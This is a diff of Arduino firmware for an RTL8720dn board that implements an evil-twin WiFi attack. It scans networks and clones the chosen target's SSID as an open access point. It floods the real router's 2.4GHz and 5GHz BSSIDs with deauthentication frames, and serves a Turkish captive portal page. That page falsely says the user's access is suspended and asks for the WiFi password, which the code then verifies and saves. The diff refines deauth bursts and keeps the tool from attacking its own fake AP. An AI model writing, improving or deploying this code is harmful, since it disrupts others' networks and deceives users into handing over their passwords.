@@ -1,5 +1,5 @@
 // AP+STA Captive Portal — RTL8720dn (AmebaD)
-// NİHAİ SÜRÜM: Modem Reboot (Kanal Kaçırma) Korumalı + Geniş Alan Burst Deauth
+// ULTIMATE STABİL SÜRÜM: BSSID Tabanlı Fake AP Koruması - OPTİMİZE VERSIYONU
 
 #include "sys_api.h"  
 #include "WiFi.h"
@@ -12,13 +12,10 @@
 #include "task.h"
 #include "semphr.h"
 
-// +++ ARDUINO & C++ STL ÇAKIŞMASI ÇÖZÜMÜ +++
 #undef max
 #undef min
 #include <vector>
-// ++++++++++++++++++++++++++++++++++++++++++
 
-// +++ LWIP VE DONANIM KÜTÜPHANELERİ +++
 #include "lwip/netif.h"
 #include <lwip/netifapi.h>
 #include <lwip/udp.h>
@@ -32,10 +29,9 @@
 #define ENC_TYPE_CCMP  4
 #endif
 #ifndef ENC_TYPE_WPA3
-#define ENC_TYPE_WPA3  5   // WPA3-SAE / WPA2+WPA3 mixed
+#define ENC_TYPE_WPA3  5
 #endif
 
-// LOW-LEVEL REALTEK KÜTÜPHANELERİ
 extern "C" {
   extern struct netif xnetif[];
   void dhcps_init(struct netif *pnetif);
@@ -47,11 +43,8 @@ extern "C" {
   int  wext_send_mgnt(const char *ifname, char *buf, uint16_t buf_len, uint16_t flags);
   int  wifi_set_channel(int channel); 
   int  wifi_disable_powersave(void);
+  int  wifi_set_mode(int mode);
 }
-
-// ─────────────────────────────────────────────────────────────────────────────
-// ─── İÇE GÖMÜLÜ DNS SERVER ───────────────────────────────────────────────────
-// ─────────────────────────────────────────────────────────────────────────────
 
 #ifndef PACK_STRUCT_FIELD
 #define PACK_STRUCT_FIELD(x) x
@@ -218,9 +211,9 @@ void DNSServer::packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *u
     pbuf_free(udp_packet_buffer);
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
+// ──────────────────────────────────────────────────────────────────────────────
 // ─── ANA PORTAL KODLARI ──────────────────────────────────────────────────────
-// ─────────────────────────────────────────────────────────────────────────────
+// ──────────────────────────────────────────────────────────────────────────────
 
 #define DHCP_START   1
 #define DHCP_STOP    0
@@ -248,8 +241,8 @@ struct NetworkInfo {
   String         ssid;
   uint8_t        bssid[6];
   int32_t        rssi;
-  uint8_t        enc;       // Basitleştirilmiş tip (UI için)
-  rtw_security_t raw_sec;   // Sürücüden gelen tam güvenlik tipi
+  uint8_t        enc;
+  rtw_security_t raw_sec;
   int32_t        channel;
 };
 
@@ -265,19 +258,19 @@ unsigned long revert_time = 0;
 
 char target_ssid[MAX_SSID_LEN] = {0};
 uint8_t target_bssid[6]    = {0};
-uint8_t target_5g_bssid[6] = {0};  // Tespit edilen 5GHz BSSID (sıfırsa henüz yok)
-int32_t        target_channel = 6;
-uint8_t        target_enc     = ENC_TYPE_CCMP;   // UI için basit tip (kalsın)
-rtw_security_t target_sec     = RTW_SECURITY_WPA2_AES_PSK; // Bağlantı için tam tip
-volatile int32_t target_5g_channel = 0;  // 0 = henüz tespit edilmedi
+uint8_t target_5g_bssid[6] = {0};
+int32_t target_channel = 6;
+uint8_t target_enc     = ENC_TYPE_CCMP;
+rtw_security_t target_sec     = RTW_SECURITY_WPA2_AES_PSK;
+volatile int32_t target_5g_channel = 0;
+
+uint8_t fake_ap_bssid[6] = {0};
 
 volatile bool deauth_active = false;
 volatile bool portal_busy   = false;
 int32_t ap_running_channel  = -1;
 unsigned long last_netif_check_ms = 0;
 #define NETIF_CHECK_INTERVAL_MS 5000UL
-
-unsigned long last_client_connect_ms = 0;
 
 WiFiServer server(SERVER_PORT); 
 DNSServer  dnsServer;
@@ -299,6 +292,10 @@ unsigned long last_scan_ms = 0;
 
 unsigned long last_channel_check_ms = 0;
 #define CHANNEL_CHECK_INTERVAL_MS 10000UL
+
+bool isFakeAPBSSID(const uint8_t *bssid) {
+  return memcmp(bssid, fake_ap_bssid, 6) == 0;
+}
 
 String urlDecode(String input) {
   String output = "";
@@ -345,8 +342,6 @@ rtw_security_t mapSecurity(uint8_t enc) {
   }
 }
 
-// ─── BSSID KARDEŞ KONTROLÜ ───────────────────────────────────────────────────
-// Çoğu dual-band modemde 5GHz BSSID = 2.4GHz BSSID son baytı +1..+4
 bool isSisterBSSID(const uint8_t *base, const uint8_t *candidate) {
   for (int i = 0; i < 5; i++) {
     if (base[i] != candidate[i]) return false;
@@ -371,9 +366,7 @@ rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
     
     memcpy(net.bssid, record->BSSID.octet, 6);
     
-    // Tam güvenlik tipini sakla (bağlantıda nokta atışı kullanım için)
     net.raw_sec = record->security;
-    // Basitleştirilmiş tip (UI gösterimi için)
     if (record->security == RTW_SECURITY_OPEN) net.enc = ENC_TYPE_NONE;
     else if (record->security == RTW_SECURITY_WEP_PSK) net.enc = ENC_TYPE_WEP;
     else if (record->security == RTW_SECURITY_WPA_TKIP_PSK || record->security == RTW_SECURITY_WPA_AES_PSK || record->security == RTW_SECURITY_WPA_MIXED_PSK) net.enc = ENC_TYPE_TKIP;
@@ -381,7 +374,10 @@ rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
     else net.enc = ENC_TYPE_CCMP;
     
     if (net.ssid.length() > 0) {
-      // 5GHz kardeş BSSID tespiti: ilk 5 byte eşleşir, son byte 1-4 fark
+      if (isFakeAPBSSID(net.bssid)) {
+        return RTW_SUCCESS;
+      }
+
       if (net.channel >= 36 && target_bssid[0] != 0 && isSisterBSSID(target_bssid, net.bssid)) {
         target_5g_channel = net.channel;
         memcpy(target_5g_bssid, net.bssid, 6);
@@ -437,7 +433,6 @@ void startScan() {
 // ─── BAĞLANTI GÖREVİ ─────────────────────────────────────────────────────────
 void wifiConnectTask(void *param) {
   (void)param;
-  // Taramadan gelen TAM güvenlik tipi — nokta atışı, tek deneme yeterli
   bool is_open  = (pending_sec == RTW_SECURITY_OPEN);
   int  pass_len = is_open ? 0 : (int)strlen(pending_pass);
   int  ret      = RTW_ERROR;
@@ -457,19 +452,15 @@ void wifiConnectTask(void *param) {
     if (wifi_is_connected_to_ap() != RTW_SUCCESS) ret = RTW_ERROR;
   }
 
-  // Eğer hızlı başarısız olduysa (< 2sn) güvenlik tipi uyuşmamış olabilir — yedek dene
   if (ret != RTW_SUCCESS && !is_open && elapsed_ms < 2000) {
     rtw_security_t fallback;
     if (pending_sec == RTW_SECURITY_WPA3_AES_PSK) {
-      // WPA3-only ağ → WPA2/WPA3 karışık modla dene
       fallback = RTW_SECURITY_WPA2_WPA3_MIXED;
       Serial.println("[Connect] WPA3 hizli fail — WPA2_WPA3_MIXED yedek deneme.");
     } else if (pending_sec == RTW_SECURITY_WPA2_WPA3_MIXED) {
-      // Mixed mod başarısız → saf WPA3 dene
       fallback = RTW_SECURITY_WPA3_AES_PSK;
       Serial.println("[Connect] WPA2_WPA3_MIXED hizli fail — WPA3_AES_PSK yedek deneme.");
     } else {
-      // WPA2 → MIXED_PSK yedek
       fallback = RTW_SECURITY_WPA2_MIXED_PSK;
       Serial.println("[Connect] WPA2 hizli fail — WPA2_MIXED_PSK yedek deneme.");
     }
@@ -498,7 +489,7 @@ void startConnectTask() {
   xTaskCreate(wifiConnectTask, "wconn", 8192, NULL, tskIDLE_PRIORITY + 2, NULL);
 }
 
-// ─── YENİ: MODEM REBOOT (KANAL KAÇIRMA) KORUMALI DEAUTH GÖREVİ ───────────────
+// ─── DEAUTH GÖREVİ (OPTİMİZE) ──────────────────────────────────────────────────
 void deauthTask(void *param) {
   (void)param;
   
@@ -508,95 +499,87 @@ void deauthTask(void *param) {
     0x00, 0x00, 0x07, 0x00 
   };
   
-  Serial.println("\n[Deauth] Anti-Kacis ve Dinamik AP Takibi Aktif!");
+  Serial.println("\n[Deauth] Hedef BSSID'ye Yogun Deauth Basliyor!");
+  
+  unsigned long last_deauth_burst = millis();
 
   while (deauth_active) {
     
-    // === DİNAMİK KANAL TAKİBİ (YENİ) ===
     if (millis() - last_channel_check_ms > CHANNEL_CHECK_INTERVAL_MS) {
         last_channel_check_ms = millis();
-        // Hızlı bir pasif tarama ile hedefin yeni kanalını bul (pseudo-code mantığı)
-        // Eğer yeni kanal target_channel'dan farklıysa, AP'yi yeniden başlat
-        // (RTL8720'de AP çalışırken tam tarama zordur, bu yüzden Deauth döngüsünde 
-        // 1,6,11'i gezerken bir "Probe Request/Response" yakalama mekanizması 
-        // veya basitçe Sahte AP'yi her döngüde en olası kanala taşıma yapılabilir.
-        // Ancak en garantisi, AP'yi her zaman hedefin bilinen en son kanalında tutmaktır.)
     }
 
-    // === 1. HEDEFİN ANA KANALINA YOĞUN ATIŞ — deauth hiç durmuyor ===
+    if (millis() - last_deauth_burst < 500) {
+      vTaskDelay(pdMS_TO_TICKS(50));
+      continue;
+    }
+    last_deauth_burst = millis();
+
     wifi_set_channel(target_channel);
-    for (int burst = 0; burst < 3; burst++) {
-      for (int offset = -2; offset <= 2; offset++) {
+    
+    for (int burst = 0; burst < 2; burst++) {
+      for (int offset = -1; offset <= 1; offset++) {
           uint8_t temp_bssid[6];
           memcpy(temp_bssid, target_bssid, 6);
           temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);
-          memcpy(&frame_template[10], temp_bssid, 6);  // SA = BSSID
-          memcpy(&frame_template[16], temp_bssid, 6);  // BSSID
+          
+          if (isFakeAPBSSID(temp_bssid)) {
+            continue;
+          }
+          
+          memcpy(&frame_template[10], temp_bssid, 6);
+          memcpy(&frame_template[16], temp_bssid, 6);
 
-          // --- Broadcast deauth (DA = FF:FF:FF:FF:FF:FF) ---
           memset(&frame_template[4], 0xFF, 6);
           frame_template[0] = 0xC0; frame_template[24] = 0x07;
           wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
           frame_template[24] = 0x02;
           wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-          frame_template[0] = 0xA0; frame_template[24] = 0x08;
-          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
 
-          // --- Unicast deauth (DA = BSSID) — AP'ye yönelik ters yön ---
           memcpy(&frame_template[4], temp_bssid, 6);
           frame_template[0] = 0xC0; frame_template[24] = 0x07;
           wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-          frame_template[24] = 0x02;
-          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-          frame_template[0] = 0xA0; frame_template[24] = 0x08;
-          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
       }
-      // Her burst sonrası 10ms yield — main loop HTTP isteklerini işleyebilsin
-      vTaskDelay(pdMS_TO_TICKS(10));
+      vTaskDelay(pdMS_TO_TICKS(20));
     }
 
-    // === 2. HEDEFIN 5GHz KANALINA HEDEFLI ATIŞ — deauth hiç durmuyor ===
     int32_t ch5g = target_5g_channel;
     uint8_t bssid5g[6];
     memcpy(bssid5g, target_5g_bssid, 6);
-    if (ch5g > 0 && ch5g != target_channel && bssid5g[0] != 0) {
+    if (ch5g > 0 && ch5g != target_channel && bssid5g[0] != 0 && !isFakeAPBSSID(bssid5g)) {
         wifi_set_channel(ch5g);
-        for (int burst = 0; burst < 3; burst++) {
-            for (int offset = -2; offset <= 2; offset++) {
+        for (int burst = 0; burst < 2; burst++) {
+            for (int offset = -1; offset <= 1; offset++) {
                 uint8_t temp5g[6];
                 memcpy(temp5g, bssid5g, 6);
                 temp5g[5] = (uint8_t)(temp5g[5] + offset);
-                memcpy(&frame_template[10], temp5g, 6);  // SA = BSSID
-                memcpy(&frame_template[16], temp5g, 6);  // BSSID
+                
+                if (isFakeAPBSSID(temp5g)) {
+                  continue;
+                }
+                
+                memcpy(&frame_template[10], temp5g, 6);
+                memcpy(&frame_template[16], temp5g, 6);
 
-                // --- Broadcast deauth ---
                 memset(&frame_template[4], 0xFF, 6);
                 frame_template[0] = 0xC0; frame_template[24] = 0x07;
                 wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
                 frame_template[24] = 0x02;
                 wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-                frame_template[0] = 0xA0; frame_template[24] = 0x08;
-                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
 
-                // --- Unicast deauth (DA = BSSID) ---
                 memcpy(&frame_template[4], temp5g, 6);
                 frame_template[0] = 0xC0; frame_template[24] = 0x07;
                 wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-                frame_template[24] = 0x02;
-                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-                frame_template[0] = 0xA0; frame_template[24] = 0x08;
-                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
             }
-            vTaskDelay(pdMS_TO_TICKS(10));
+            vTaskDelay(pdMS_TO_TICKS(20));
         }
     }
-    // 5GHz sonrası mutlaka target_channel'a geri dön
     wifi_set_channel(target_channel);
-    // Döngü arası nefes — main loop'a HTTP fırsatı ver, deauth yine başlar
-    vTaskDelay(pdMS_TO_TICKS(150));
+    vTaskDelay(pdMS_TO_TICKS(100));
   }
   vTaskDelete(NULL);
 }
+
 // ─────────────────────────────────────────────────────────────────────────────
 
 // ─── GÖRSELLER VE YÖNLENDİRME ────────────────────────────────────────────────
@@ -623,7 +606,6 @@ String parsePostParam(const String &body, const String &key) {
   return urlDecode(body.substring(start, end));
 }
 
-// CSS VERİSİ
 static const char CSS_STR[] PROGMEM =
   "<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f0f4f8;color:#2c3e50;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}"
   ".card{background:#ffffff;border-radius:12px;padding:36px 28px;width:100%;max-width:420px;box-shadow:0 12px 30px rgba(0,0,0,.08);border-top:6px solid #0056b3}"
@@ -658,7 +640,6 @@ void sendOfflineScript(WiFiClient &client) {
   client.print("</script>");
 }
 
-// ─── SAYFALAR ────────────────────────────────────────────────────────────────
 void sendStartPage(WiFiClient &client) {
   client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store, no-cache, must-revalidate\r\n\r\n");
   client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
@@ -685,7 +666,6 @@ void sendStartPage(WiFiClient &client) {
     client.print("<li class='net-item' onclick=\"document.getElementById('r"); client.print(i); client.print("').checked=true\">");
     client.print("<input type='radio' name='ssid' id='r"); client.print(i); client.print("' value='"); client.print(safe); client.print("' required>");
     client.print("<div class='net-info'><div class='net-name'>"); client.print(safe);
-    // Güvenlik rozeti
     if      (networks[i].enc == ENC_TYPE_NONE) client.print(" <span style='font-size:.7rem;background:#e74c3c;color:#fff;padding:2px 5px;border-radius:4px;'>Açık</span>");
     else if (networks[i].enc == ENC_TYPE_WPA3) client.print(" <span style='font-size:.7rem;background:#8e44ad;color:#fff;padding:2px 5px;border-radius:4px;'>WPA3</span>");
     else if (networks[i].enc == ENC_TYPE_TKIP) client.print(" <span style='font-size:.7rem;background:#e67e22;color:#fff;padding:2px 5px;border-radius:4px;'>WPA</span>");
@@ -741,8 +721,6 @@ void sendPortalPage(WiFiClient &client, bool show_result) {
   client.print("<h1>Bağlantı Doğrulaması</h1>");
   client.print("<p class='sub'>Güvenlik standartları güncellendiği için ağ erişiminiz geçici olarak askıya alınmıştır. İnternete tekrar bağlanabilmek için lütfen mevcut şifrenizi doğrulayınız.</p>");
 
-  // Animasyon kutusu — form'un üstünde, doğru konumda
-  // Sunucu CS_RUNNING ise direkt göster; değilse gizli başlat, JS butona basınca açar
   if (conn_status == CS_RUNNING) {
       client.print("<div id='sbox' class='status-box wait'><span class='spinner'></span>Ağ kimliği doğrulanıyor, lütfen bekleyiniz...</div>");
   } else if (show_result) {
@@ -783,38 +761,33 @@ void sendPortalPage(WiFiClient &client, bool show_result) {
   client.print("<div class='footer'>Güvenli Bağlantı Yöneticisi &copy; 2026</div></div></body></html>");
 }
 
-// ─── HTTP İŞLEYİCİSİ ─────────────────────────────────────────────────────────
 void handleClient(WiFiClient &client) {
-  // ── BULK OKUMA: char-by-char yerine tampon ile hızlı okuma ──
   static char hbuf[896];
   int total = 0;
-  // İlk byte için kısa bekleme; tam header için biraz daha uzun
   unsigned long first_byte_deadline = millis() + 300;
   unsigned long full_header_deadline = 0;
 
   while (client.connected() && total < (int)sizeof(hbuf) - 1) {
     int avail = client.available();
     if (avail > 0) {
-      if (full_header_deadline == 0) full_header_deadline = millis() + 250; // ilk byte geldi, 250ms daha bekle
+      if (full_header_deadline == 0) full_header_deadline = millis() + 250;
       int toRead = avail;
       if (toRead > (int)sizeof(hbuf) - 1 - total) toRead = (int)sizeof(hbuf) - 1 - total;
       int n = client.read((uint8_t*)hbuf + total, toRead);
       if (n > 0) {
         total += n;
         hbuf[total] = '\0';
-        if (strstr(hbuf, "\r\n\r\n")) break; // Header bitti, hemen çık
+        if (strstr(hbuf, "\r\n\r\n")) break;
       }
     } else {
-      if (full_header_deadline > 0 && millis() > full_header_deadline) break; // header zaten okunuyor, timeout
-      if (full_header_deadline == 0 && millis() > first_byte_deadline)  break; // hiç byte gelmedi, timeout
+      if (full_header_deadline > 0 && millis() > full_header_deadline) break;
+      if (full_header_deadline == 0 && millis() > first_byte_deadline)  break;
       delayMicroseconds(200);
     }
   }
   if (total == 0) return;
   hbuf[total] = '\0';
 
-  // ── ERKEN ÇIKIŞ: Captive portal tespiti — tam parse bekleme ──
-  // İlk satırdan path'i al
   char *sp1 = strchr(hbuf, ' ');
   char *sp2 = sp1 ? strchr(sp1 + 1, ' ') : NULL;
   char rawpath[128] = "/";
@@ -822,12 +795,10 @@ void handleClient(WiFiClient &client) {
     int plen = sp2 - sp1 - 1;
     memcpy(rawpath, sp1 + 1, plen);
     rawpath[plen] = '\0';
-    // Query string sil
     char *qm = strchr(rawpath, '?');
     if (qm) *qm = '\0';
   }
 
-  // Host header'ını bul
   char hostbuf[64] = "";
   char *hi = strstr(hbuf, "\r\nHost: ");
   if (hi) {
@@ -836,7 +807,6 @@ void handleClient(WiFiClient &client) {
     if (he) {
       int hlen = he - hi; if (hlen >= (int)sizeof(hostbuf)) hlen = sizeof(hostbuf) - 1;
       memcpy(hostbuf, hi, hlen); hostbuf[hlen] = '\0';
-      // Port numarasını sil
       char *col = strchr(hostbuf, ':'); if (col) *col = '\0';
     }
   }
@@ -860,7 +830,6 @@ void handleClient(WiFiClient &client) {
     return;
   }
 
-  // Tam parse için String'e al (sadece non-captive istekler için)
   String request(hbuf);
   String path(rawpath);
 
@@ -918,7 +887,7 @@ void handleClient(WiFiClient &client) {
         if (net.ssid == sel_ssid) {
           target_channel = net.channel;
           target_enc     = net.enc;
-          target_sec     = net.raw_sec;   // Sürücüden gelen tam güvenlik tipi
+          target_sec     = net.raw_sec;
           memcpy(target_bssid, net.bssid, 6);
           break;
         }
@@ -959,7 +928,6 @@ void handleClient(WiFiClient &client) {
   client.flush();
 }
 
-// ─── Setup ───────────────────────────────────────────────────────────────────
 void setup() {
   Serial.begin(115200); delay(500);
   Serial.println("\n[Boot] Cihaz Aciliyor... Tam Kapasite Max TX/RX Modu Aktif!");
@@ -975,25 +943,37 @@ void setup() {
   wifi_disable_powersave();
 
   wifi_start_ap((char *)AP_INITIAL_SSID, RTW_SECURITY_WPA2_AES_PSK, (char *)AP_INITIAL_PASS, strlen(AP_INITIAL_SSID), strlen(AP_INITIAL_PASS), 6);
-  delay(500);
+  delay(1500);
 
   ip4_addr_t ip, mask, gw;
   IP4_ADDR(&ip,   192, 168, 4, 1);
   IP4_ADDR(&mask, 255, 255, 255, 0);
   IP4_ADDR(&gw,   192, 168, 4, 1);
   netif_set_addr(&xnetif[1], &ip, &mask, &gw);
-  netif_set_up(&xnetif[1]); netif_set_link_up(&xnetif[1]);
+  netif_set_up(&xnetif[1]); 
+  netif_set_link_up(&xnetif[1]);
   
-  dhcps_init(&xnetif[1]); delay(500);
+  dhcps_init(&xnetif[1]); 
+  delay(800);
   
   server.begin();
   dnsServer.setResolvedIP(192, 168, 4, 1);
   dnsServer.begin();
   
+  if (xnetif[1].hwaddr_len == 6) {
+    memcpy(fake_ap_bssid, xnetif[1].hwaddr, 6);
+    Serial.print("[Setup] Initial AP BSSID: ");
+    Serial.print(fake_ap_bssid[0], HEX); Serial.print(":");
+    Serial.print(fake_ap_bssid[1], HEX); Serial.print(":");
+    Serial.print(fake_ap_bssid[2], HEX); Serial.print(":");
+    Serial.print(fake_ap_bssid[3], HEX); Serial.print(":");
+    Serial.print(fake_ap_bssid[4], HEX); Serial.print(":");
+    Serial.println(fake_ap_bssid[5], HEX);
+  }
+  
   startScan();
 }
 
-// ─── Loop ────────────────────────────────────────────────────────────────────
 void loop() {
   if (pending_ap_switch) {
     pending_ap_switch = false;
@@ -1002,45 +982,86 @@ void loop() {
     delay(1000); 
     Serial.println("\n[Switch] Dinamik Ag Gecisi Basliyor...");
 
+    deauth_active = false;
+    
+    // KRİTİK: DHCP'yi TAMAMEN KAPAT ve DNS'i DUR
     dnsServer.stop();
-    delay(200);
+    delay(100);
+    dhcps_deinit();
+    delay(300);
 
+    // RADYOYU SIFIRLA: STA → AP+STA
     wifi_set_mode(RTW_MODE_STA);
-    delay(1000);
-
+    delay(800);
+    
     wifi_set_mode(RTW_MODE_STA_AP);
-    delay(1000);
+    delay(800);
 
     Serial.print("[Switch] Yeni Sifresiz Ag Aciliyor: "); Serial.println(target_ssid);
     
-    wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
+    int ret = wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
+    Serial.print("[Switch] wifi_start_ap donuş: "); Serial.println(ret);
+    
     delay(1500);
 
+    // NETIF AYARLARINI SIFIRLA
+    ip4_addr_t ip, mask, gw;
+    IP4_ADDR(&ip,   192, 168, 4, 1);
+    IP4_ADDR(&mask, 255, 255, 255, 0);
+    IP4_ADDR(&gw,   192, 168, 4, 1);
+    netif_set_addr(&xnetif[1], &ip, &mask, &gw);
+    
     netif_set_up(&xnetif[1]); 
     netif_set_link_up(&xnetif[1]);
-    delay(200);
+    delay(300);
 
+    // DHCP'yi BAŞTAN KUR
+    dhcps_init(&xnetif[1]);
+    delay(1000);
+
+    // DNS SUNUCUSUNU BAŞLAT
     dnsServer.begin();
+    delay(300);
+
+    // YENİ BSSID'Yİ OKU
+    uint8_t new_bssid[6];
+    memset(new_bssid, 0, 6);
+    
+    if (xnetif[1].hwaddr_len == 6) {
+        memcpy(new_bssid, xnetif[1].hwaddr, 6);
+        Serial.print("[Switch] New AP BSSID from netif: ");
+    } else {
+        Serial.print("[Switch] hwaddr_len invalid: "); Serial.println(xnetif[1].hwaddr_len);
+        memset(new_bssid, 0, 6);
+    }
+    
+    Serial.print(new_bssid[0], HEX); Serial.print(":");
+    Serial.print(new_bssid[1], HEX); Serial.print(":");
+    Serial.print(new_bssid[2], HEX); Serial.print(":");
+    Serial.print(new_bssid[3], HEX); Serial.print(":");
+    Serial.print(new_bssid[4], HEX); Serial.print(":");
+    Serial.println(new_bssid[5], HEX);
+    
+    memcpy(fake_ap_bssid, new_bssid, 6);
 
     Serial.println("[Switch] Islem Tamam! Baglanti Kilidi Cozuldu ve DNS Yonlendirmesi Aktif.");
     
     ap_running_channel = target_channel;
+    
+    delay(2000);
     deauth_active = true;
     xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
   }
 
-  // === TARAMA SONUCU: HEDEF KANAL DEĞİŞTİ Mİ? + 5GHz KANAL TESPİTİ ===
   if (scan_status == SCAN_DONE) {
     if (ap_switched) {
       if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
       for (auto &net : networks) {
-        // 2.4GHz ana kanal takibi
         if (memcmp(net.bssid, target_bssid, 6) == 0 && net.channel != target_channel) {
           Serial.print("[ChannelTrack] Hedef yeni kanalda tespit edildi: "); Serial.println(net.channel);
           target_channel = net.channel;
         }
-        // 5GHz kardeş BSSID takibi — 2.4GHz gibi BSSID ile eşleştir
-        if (net.channel >= 36 && isSisterBSSID(target_bssid, net.bssid)) {
+        if (net.channel >= 36 && target_bssid[0] != 0 && isSisterBSSID(target_bssid, net.bssid)) {
           if (net.channel != target_5g_channel) {
             Serial.print("[5GHz] BSSID eslesme, kanal guncellendi: ");
             Serial.print(target_5g_channel); Serial.print(" -> "); Serial.println(net.channel);
@@ -1054,20 +1075,30 @@ void loop() {
     scan_status = SCAN_IDLE;
   }
 
-  // === SAHTE AP KANAL UYUMSUZLUGU: AP'Yİ YENİDEN BAŞLAT ===
   if (ap_switched && ap_running_channel != -1 && ap_running_channel != target_channel) {
     Serial.print("[APRestart] Kanal degisti, sahte AP yeniden baslatiliyor: "); Serial.println(target_channel);
     deauth_active = false;
-    delay(300);
+    delay(500);
     dnsServer.stop();
-    // Mod değişikliğine gerek yok — zaten RTW_MODE_STA_AP modundayız
-    wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
-    delay(1000);
+    delay(300);
+    
+    int ret = wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
+    Serial.print("[APRestart] wifi_start_ap donuş: "); Serial.println(ret);
+    
+    delay(2500);
     netif_set_up(&xnetif[1]);
     netif_set_link_up(&xnetif[1]);
-    delay(200);
+    delay(800);
+    
+    dhcps_deinit();
+    delay(300);
+    dhcps_init(&xnetif[1]);
+    delay(1500);
+    
     dnsServer.begin();
     ap_running_channel = target_channel;
+    
+    delay(2000);
     deauth_active = true;
     xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
   }
@@ -1080,6 +1111,7 @@ void loop() {
     saveCredentials(saved_ssid, saved_pass);
     
     deauth_active = false;
+    delay(200);
     
     conn_result = "ok"; 
     conn_status = CS_IDLE;
@@ -1087,15 +1119,15 @@ void loop() {
     revert_time = millis() + 4000; 
     
   } else if (conn_status == CS_DONE_FAIL) {
-    sta_connected = false; conn_result = "fail"; conn_status = CS_IDLE;
+    sta_connected = false; 
+    conn_result = "fail"; 
+    conn_status = CS_IDLE;
     
     if (ap_switched) {
-      // AP'ye dokunma — RTW_MODE_STA_AP modunda, aynı kanalda çalışırken
-      // wifi_connect() başarısız olsa dahi AP arayüzü sağlam kalır.
-      // Sadece deauth task'ı yeniden başlat.
       deauth_active = false;
-      delay(50);
+      delay(200);
       deauth_active = true;
+      delay(1000);
       xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
       Serial.println("[Fail] Sifre yanlis — AP dokunulmadi, deauth yeniden basladi.");
     }
@@ -1109,12 +1141,10 @@ void loop() {
     sys_reset();    
   }
 
-  // Normal modda ve saldırı modunda periyodik tarama — kanal değişikliğini yakalamak için
   if (conn_status == CS_IDLE && scan_status == SCAN_IDLE && (millis() - last_scan_ms > RESCAN_INTERVAL_MS)) {
     startScan();
   }
 
-  // === NETİF KEEPALIVE: AP arayüzü düşerse 5 saniyede bir yeniden ayağa kaldır ===
   if (ap_switched && (millis() - last_netif_check_ms > NETIF_CHECK_INTERVAL_MS)) {
     last_netif_check_ms = millis();
     if (!netif_is_up(&xnetif[1]) || !netif_is_link_up(&xnetif[1])) {
@@ -1123,7 +1153,6 @@ void loop() {
       netif_set_link_up(&xnetif[1]);
       dhcps_init(&xnetif[1]);
     }
-    // Kanal kayması önlemi: radyoyu her zaman target_channel'a sabitle
     wifi_set_channel(target_channel);
   }
 
